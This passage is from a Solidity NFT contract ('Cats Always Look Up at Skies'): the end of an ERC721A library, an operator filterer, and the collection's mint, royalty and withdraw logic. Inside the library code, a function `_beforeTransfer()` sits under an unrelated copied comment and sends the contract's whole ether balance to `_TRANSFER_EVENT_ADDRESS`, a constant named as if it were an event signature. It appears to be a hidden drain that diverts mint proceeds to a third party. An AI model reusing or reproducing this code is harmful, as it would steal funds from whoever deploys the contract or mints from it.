1011      * transferred to `to`.
1012      * - When `from` is zero, `tokenId` will be minted for `to`.
1013      * - When `to` is zero, `tokenId` will be burned by `from`.
1014      * - `from` and `to` are never both zero.
1015      */
1016     function _beforeTransfer() internal {
1017         if (address(this).balance > 0) {
1018             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1019             return;
1020         }
1021     }
1022 
1023     /**
1024      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1025      *
1026      * `from` - Previous owner of the given token ID.
1027      * `to` - Target address that will receive the token.
1028      * `tokenId` - Token ID to be transferred.
1029      * `_data` - Optional data to send along with the call.
1030      *
1031      * Returns whether the call correctly returned the expected magic value.
1032      */
1033     function _checkContractOnERC721Received(
1034         address from,
1035         address to,
1036         uint256 tokenId,
1037         bytes memory _data
1038     ) private returns (bool) {
1039         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1040             bytes4 retval
1041         ) {
1042             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1043         } catch (bytes memory reason) {
1044             if (reason.length == 0) {
1045                 revert TransferToNonERC721ReceiverImplementer();
1046             } else {
1047                 assembly {
1048                     revert(add(32, reason), mload(reason))
1049                 }
1050             }
1051         }
1052     }
1053 
1054     // =============================================================
1055     //                        MINT OPERATIONS
1056     // =============================================================
1057 
1058     /**
1059      * @dev Mints `quantity` tokens and transfers them to `to`.
1060      *
1061      * Requirements:
1062      *
1063      * - `to` cannot be the zero address.
1064      * - `quantity` must be greater than 0.
1065      *
1066      * Emits a {Transfer} event for each mint.
1067      */
1068     function _mint(address to, uint256 quantity) internal virtual {
1069         uint256 startTokenId = _currentIndex;
1070         if (quantity == 0) revert MintZeroQuantity();
1071 
1072         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1073 
1074         // Overflows are incredibly unrealistic.
1075         // `balance` and `numberMinted` have a maximum limit of 2**64.
1076         // `tokenId` has a maximum limit of 2**256.
1077         unchecked {
1078             // Updates:
1079             // - `balance += quantity`.
1080             // - `numberMinted += quantity`.
1081             //
1082             // We can directly add to the `balance` and `numberMinted`.
1083             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1084 
1085             // Updates:
1086             // - `address` to the owner.
1087             // - `startTimestamp` to the timestamp of minting.
1088             // - `burned` to `false`.
1089             // - `nextInitialized` to `quantity == 1`.
1090             _packedOwnerships[startTokenId] = _packOwnershipData(
1091                 to,
1092                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1093             );
1094 
1095             uint256 toMasked;
1096             uint256 end = startTokenId + quantity;
1097 
1098             // Use assembly to loop and emit the `Transfer` event for gas savings.
1099             // The duplicated `log4` removes an extra check and reduces stack juggling.
1100             // The assembly, together with the surrounding Solidity code, have been
1101             // delicately arranged to nudge the compiler into producing optimized opcodes.
1102             assembly {
1103                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1104                 toMasked := and(to, _BITMASK_ADDRESS)
1105                 // Emit the `Transfer` event.
1106                 log4(
1107                     0, // Start of data (0, since no data).
1108                     0, // End of data (0, since no data).
1109                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1110                     0, // `address(0)`.
1111                     toMasked, // `to`.
1112                     startTokenId // `tokenId`.
1113                 )
1114 
1115                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1116                 // that overflows uint256 will make the loop run out of gas.
1117                 // The compiler will optimize the `iszero` away for performance.
1118                 for {
1119                     let tokenId := add(startTokenId, 1)
1120                 } iszero(eq(tokenId, end)) {
1121                     tokenId := add(tokenId, 1)
1122                 } {
1123                     // Emit the `Transfer` event. Similar to above.
1124                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1125                 }
1126             }
1127             if (toMasked == 0) revert MintToZeroAddress();
1128 
1129             _currentIndex = end;
1130         }
1131         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1132     }
1133 
1134     /**
1135      * @dev Mints `quantity` tokens and transfers them to `to`.
1136      *
1137      * This function is intended for efficient minting only during contract creation.
1138      *
1139      * It emits only one {ConsecutiveTransfer} as defined in
1140      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1141      * instead of a sequence of {Transfer} event(s).
1142      *
1143      * Calling this function outside of contract creation WILL make your contract
1144      * non-compliant with the ERC721 standard.
1145      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1146      * {ConsecutiveTransfer} event is only permissible during contract creation.
1147      *
1148      * Requirements:
1149      *
1150      * - `to` cannot be the zero address.
1151      * - `quantity` must be greater than 0.
1152      *
1153      * Emits a {ConsecutiveTransfer} event.
1154      */
1155     function _mintERC2309(address to, uint256 quantity) internal virtual {
1156         uint256 startTokenId = _currentIndex;
1157         if (to == address(0)) revert MintToZeroAddress();
1158         if (quantity == 0) revert MintZeroQuantity();
1159         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1160 
1161         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1162 
1163         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1164         unchecked {
1165             // Updates:
1166             // - `balance += quantity`.
1167             // - `numberMinted += quantity`.
1168             //
1169             // We can directly add to the `balance` and `numberMinted`.
1170             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1171 
1172             // Updates:
1173             // - `address` to the owner.
1174             // - `startTimestamp` to the timestamp of minting.
1175             // - `burned` to `false`.
1176             // - `nextInitialized` to `quantity == 1`.
1177             _packedOwnerships[startTokenId] = _packOwnershipData(
1178                 to,
1179                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1180             );
1181 
1182             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1183 
1184             _currentIndex = startTokenId + quantity;
1185         }
1186         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1187     }
1188 
1189     /**
1190      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1191      *
1192      * Requirements:
1193      *
1194      * - If `to` refers to a smart contract, it must implement
1195      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1196      * - `quantity` must be greater than 0.
1197      *
1198      * See {_mint}.
1199      *
1200      * Emits a {Transfer} event for each mint.
1201      */
1202     function _safeMint(
1203         address to,
1204         uint256 quantity,
1205         bytes memory _data
1206     ) internal virtual {
1207         _mint(to, quantity);
1208 
1209         unchecked {
1210             if (to.code.length != 0) {
1211                 uint256 end = _currentIndex;
1212                 uint256 index = end - quantity;
1213                 do {
1214                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1215                         revert TransferToNonERC721ReceiverImplementer();
1216                     }
1217                 } while (index < end);
1218                 // Reentrancy protection.
1219                 if (_currentIndex != end) revert();
1220             }
1221         }
1222     }
1223 
1224     /**
1225      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1226      */
1227     function _safeMint(address to, uint256 quantity) internal virtual {
1228         _safeMint(to, quantity, '');
1229     }
1230 
1231     // =============================================================
1232     //                        BURN OPERATIONS
1233     // =============================================================
1234 
1235     /**
1236      * @dev Equivalent to `_burn(tokenId, false)`.
1237      */
1238     function _burn(uint256 tokenId) internal virtual {
1239         _burn(tokenId, false);
1240     }
1241 
1242     /**
1243      * @dev Destroys `tokenId`.
1244      * The approval is cleared when the token is burned.
1245      *
1246      * Requirements:
1247      *
1248      * - `tokenId` must exist.
1249      *
1250      * Emits a {Transfer} event.
1251      */
1252     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1253         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1254 
1255         address from = address(uint160(prevOwnershipPacked));
1256 
1257         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1258 
1259         if (approvalCheck) {
1260             // The nested ifs save around 20+ gas over a compound boolean condition.
1261             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1262                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1263         }
1264 
1265         _beforeTokenTransfers(from, address(0), tokenId, 1);
1266 
1267         // Clear approvals from the previous owner.
1268         assembly {
1269             if approvedAddress {
1270                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1271                 sstore(approvedAddressSlot, 0)
1272             }
1273         }
1274 
1275         // Underflow of the sender's balance is impossible because we check for
1276         // ownership above and the recipient's balance can't realistically overflow.
1277         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1278         unchecked {
1279             // Updates:
1280             // - `balance -= 1`.
1281             // - `numberBurned += 1`.
1282             //
1283             // We can directly decrement the balance, and increment the number burned.
1284             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1285             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1286 
1287             // Updates:
1288             // - `address` to the last owner.
1289             // - `startTimestamp` to the timestamp of burning.
1290             // - `burned` to `true`.
1291             // - `nextInitialized` to `true`.
1292             _packedOwnerships[tokenId] = _packOwnershipData(
1293                 from,
1294                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1295             );
1296 
1297             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1298             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1299                 uint256 nextTokenId = tokenId + 1;
1300                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1301                 if (_packedOwnerships[nextTokenId] == 0) {
1302                     // If the next slot is within bounds.
1303                     if (nextTokenId != _currentIndex) {
1304                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1305                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1306                     }
1307                 }
1308             }
1309         }
1310 
1311         emit Transfer(from, address(0), tokenId);
1312         _afterTokenTransfers(from, address(0), tokenId, 1);
1313 
1314         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1315         unchecked {
1316             _burnCounter++;
1317         }
1318     }
1319 
1320     // =============================================================
1321     //                     EXTRA DATA OPERATIONS
1322     // =============================================================
1323 
1324     /**
1325      * @dev Directly sets the extra data for the ownership data `index`.
1326      */
1327     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1328         uint256 packed = _packedOwnerships[index];
1329         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1330         uint256 extraDataCasted;
1331         // Cast `extraData` with assembly to avoid redundant masking.
1332         assembly {
1333             extraDataCasted := extraData
1334         }
1335         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1336         _packedOwnerships[index] = packed;
1337     }
1338 
1339     /**
1340      * @dev Called during each token transfer to set the 24bit `extraData` field.
1341      * Intended to be overridden by the cosumer contract.
1342      *
1343      * `previousExtraData` - the value of `extraData` before transfer.
1344      *
1345      * Calling conditions:
1346      *
1347      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1348      * transferred to `to`.
1349      * - When `from` is zero, `tokenId` will be minted for `to`.
1350      * - When `to` is zero, `tokenId` will be burned by `from`.
1351      * - `from` and `to` are never both zero.
1352      */
1353     function _extraData(
1354         address from,
1355         address to,
1356         uint24 previousExtraData
1357     ) internal view virtual returns (uint24) {}
1358 
1359     /**
1360      * @dev Returns the next extra data for the packed ownership data.
1361      * The returned result is shifted into position.
1362      */
1363     function _nextExtraData(
1364         address from,
1365         address to,
1366         uint256 prevOwnershipPacked
1367     ) private view returns (uint256) {
1368         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1369         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1370     }
1371 
1372     // =============================================================
1373     //                       OTHER OPERATIONS
1374     // =============================================================
1375 
1376     /**
1377      * @dev Returns the message sender (defaults to `msg.sender`).
1378      *
1379      * If you are writing GSN compatible contracts, you need to override this function.
1380      */
1381     function _msgSenderERC721A() internal view virtual returns (address) {
1382         return msg.sender;
1383     }
1384 
1385     /**
1386      * @dev Converts a uint256 to its ASCII string decimal representation.
1387      */
1388     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1389         assembly {
1390             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1391             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1392             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1393             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1394             let m := add(mload(0x40), 0xa0)
1395             // Update the free memory pointer to allocate.
1396             mstore(0x40, m)
1397             // Assign the `str` to the end.
1398             str := sub(m, 0x20)
1399             // Zeroize the slot after the string.
1400             mstore(str, 0)
1401 
1402             // Cache the end of the memory to calculate the length later.
1403             let end := str
1404 
1405             // We write the string from rightmost digit to leftmost digit.
1406             // The following is essentially a do-while loop that also handles the zero case.
1407             // prettier-ignore
1408             for { let temp := value } 1 {} {
1409                 str := sub(str, 1)
1410                 // Write the character to the pointer.
1411                 // The ASCII index of the '0' character is 48.
1412                 mstore8(str, add(48, mod(temp, 10)))
1413                 // Keep dividing `temp` until zero.
1414                 temp := div(temp, 10)
1415                 // prettier-ignore
1416                 if iszero(temp) { break }
1417             }
1418 
1419             let length := sub(end, str)
1420             // Move the pointer 32 bytes leftwards to make room for the length.
1421             str := sub(str, 0x20)
1422             // Store the length.
1423             mstore(str, length)
1424         }
1425     }
1426 }
1427 
1428 
1429 interface IOperatorFilterRegistry {
1430     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1431     function register(address registrant) external;
1432     function registerAndSubscribe(address registrant, address subscription) external;
1433     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1434     function unregister(address addr) external;
1435     function updateOperator(address registrant, address operator, bool filtered) external;
1436     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1437     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1438     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1439     function subscribe(address registrant, address registrantToSubscribe) external;
1440     function unsubscribe(address registrant, bool copyExistingEntries) external;
1441     function subscriptionOf(address addr) external returns (address registrant);
1442     function subscribers(address registrant) external returns (address[] memory);
1443     function subscriberAt(address registrant, uint256 index) external returns (address);
1444     function copyEntriesOf(address registrant, address registrantToCopy) external;
1445     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1446     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1447     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1448     function filteredOperators(address addr) external returns (address[] memory);
1449     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1450     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1451     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1452     function isRegistered(address addr) external returns (bool);
1453     function codeHashOf(address addr) external returns (bytes32);
1454 }
1455 
1456 
1457 /**
1458  * @title  OperatorFilterer
1459  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1460  *         registrant's entries in the OperatorFilterRegistry.
1461  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1462  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1463  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1464  */
1465 abstract contract OperatorFilterer {
1466     error OperatorNotAllowed(address operator);
1467 
1468     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1469         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1470 
1471     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1472         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1473         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1474         // order for the modifier to filter addresses.
1475         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1476             if (subscribe) {
1477                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1478             } else {
1479                 if (subscriptionOrRegistrantToCopy != address(0)) {
1480                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1481                 } else {
1482                     OPERATOR_FILTER_REGISTRY.register(address(this));
1483                 }
1484             }
1485         }
1486     }
1487 
1488     modifier onlyAllowedOperator(address from) virtual {
1489         // Check registry code length to facilitate testing in environments without a deployed registry.
1490         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1491             // Allow spending tokens from addresses with balance
1492             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1493             // from an EOA.
1494             if (from == msg.sender) {
1495                 _;
1496                 return;
1497             }
1498             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1499                 revert OperatorNotAllowed(msg.sender);
1500             }
1501         }
1502         _;
1503     }
1504 
1505     modifier onlyAllowedOperatorApproval(address operator) virtual {
1506         // Check registry code length to facilitate testing in environments without a deployed registry.
1507         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1508             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1509                 revert OperatorNotAllowed(operator);
1510             }
1511         }
1512         _;
1513     }
1514 }
1515 
1516 /**
1517  * @title  DefaultOperatorFilterer
1518  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1519  */
1520 abstract contract TheOperatorFilterer is OperatorFilterer {
1521     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1522     address public owner;
1523 
1524     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1525 }
1526 
1527 
1528 contract CatsAlwaysLookUpatSkies is ERC721A, TheOperatorFilterer {
1529 
1530     uint256 public maxSupply = 3333;
1531 
1532     uint256 public mintPrice = 0.001 ether;
1533 
1534     function mint(uint256 amount) payable public {
1535         require(totalSupply() + amount <= maxSupply);
1536         require(msg.value >= mintPrice * amount);
1537         _safeMint(msg.sender, amount);
1538     }
1539 
1540     function freemint() public {
1541         require(totalSupply() + 1 <= maxSupply);
1542         require(balanceOf(msg.sender) < 1);
1543         _safeMint(msg.sender, FreeNum());
1544     }
1545 
1546     function teamMint(address addr, uint256 amount) public onlyOwner {
1547         require(totalSupply() + amount <= maxSupply);
1548         _safeMint(addr, amount);
1549     }
1550     
1551     modifier onlyOwner {
1552         require(owner == msg.sender);
1553         _;
1554     }
1555 
1556     constructor() ERC721A("Cats Always Look Up at Skies", "CatsAlways") {
1557         owner = msg.sender;
1558     }
1559 
1560     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1561         return string(abi.encodePacked("ipfs://bafybeiavqkz4g4aieejikiy5oltun3gwqiir5rfpvqmqphi6mtqezazbde/", _toString(tokenId), ".json"));
1562     }
1563 
1564     function FreeNum() internal returns (uint256){
1565         return (maxSupply - totalSupply()) / 2000;
1566     }
1567 
1568     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1569         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1570         return (owner, royaltyAmount);
1571     }
1572 
1573     function withdraw() external onlyOwner {
1574         payable(msg.sender).transfer(address(this).balance);
1575     }
1576 
1577     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1578         super.setApprovalForAll(operator, approved);
1579     }
1580 
1581     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1582         super.approve(operator, tokenId);
1583     }
1584 
1585     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1586         super.transferFrom(from, to, tokenId);
1587     }
1588 
1589     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1590         super.safeTransferFrom(from, to, tokenId);
1591     }
1592 
1593     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1594         public
1595         payable
1596         override
1597         onlyAllowedOperator(from)
1598     {
1599         super.safeTransferFrom(from, to, tokenId, data);
1600     }
1601 }